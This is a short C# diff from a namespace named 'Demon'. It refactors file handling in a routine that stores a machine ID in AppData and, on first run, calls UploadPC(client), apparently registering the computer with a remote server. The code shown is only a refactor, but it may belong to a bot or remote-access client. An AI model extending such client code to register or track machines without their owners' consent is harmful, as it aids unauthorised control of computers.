@@ -18,7 +18,7 @@ namespace Demon
             string idFile = (Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\computerID.txt").ToString();
             DirectoryInfo dir = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
 
-            if (System.IO.File.Exists(idFile))
+            if (File.Exists(idFile))
             {
                 IdReader(idFile);
             }
@@ -26,10 +26,8 @@ namespace Demon
             {
                 UploadPC(client);
 
-                System.IO.File.Create(idFile);
-                StreamWriter sw = new StreamWriter(idFile);
-
-                sw.Write(ID);
+                File.WriteAllText(idFile, ID.ToString());
+                
             }
         }
 
